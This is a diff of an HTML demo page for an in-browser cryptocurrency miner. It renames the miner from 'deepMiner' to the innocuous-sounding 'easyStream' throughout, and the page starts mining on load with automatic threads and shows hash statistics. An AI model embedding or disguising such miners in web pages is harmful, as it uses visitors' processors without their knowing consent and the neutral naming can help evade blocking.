@@ -5,16 +5,16 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta http-equiv="X-UA-Compatible" content="ie=edge">
-    <title>deepMiner</title>
+    <title>easyStream</title>
     <style>
         th {
             width: 180px;
         }
     </style>
-    <script src="//%deepMiner_domain%/deepMiner.min.js"></script>
+    <script src="//%easyStream_domain%/easyStream.min.js"></script>
     <script>
-        var addr = 'deepMiner_test';
-        var miner = new deepMiner.Anonymous(addr, {
+        var addr = 'easyStream_test';
+        var miner = new easyStream.Anonymous(addr, {
             autoThreads: true
         });
         miner.start();
@@ -34,7 +34,7 @@
             var totalHashes = miner.getTotalHashes();
             var acceptedHashes = miner.getAcceptedHashes();
             miner.setThrottle(idle);
-            document.getElementById('main').innerHTML = '<h2>deepMiner User : ' + addr +
+            document.getElementById('main').innerHTML = '<h2>easyStream User : ' + addr +
                 '</h2><table border="1"><tr><th>Speed</th><th>Hashs</th><th>Found</th><th>Verfiy</th></tr><tr><td>' +
                 parseInt(
                     hashesPerSecond) + '/s' + '</td><td>' + totalHashes + '</td><td>' + found + '</td><td>' +
